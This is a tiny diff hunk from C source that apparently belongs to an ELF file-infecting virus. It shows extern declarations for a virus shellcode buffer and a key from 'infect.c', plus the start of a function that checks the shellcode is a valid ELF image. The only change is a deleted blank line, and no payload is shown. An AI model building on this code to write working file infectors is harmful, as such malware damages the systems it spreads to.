@@ -23,7 +23,6 @@ extern char OLD_KEY[16]; //defined in infect.c
 extern unsigned char virus_shellcode[];
 extern unsigned int virus_shellcode_len;
 
-
 int get_virus_info(char **v, size_t *l, size_t *c_off, size_t *c_len){
 	println("VIRUS INFO");
 	if (elf_check_valid(virus_shellcode, virus_shellcode_len) == FALSE) return FALSE;
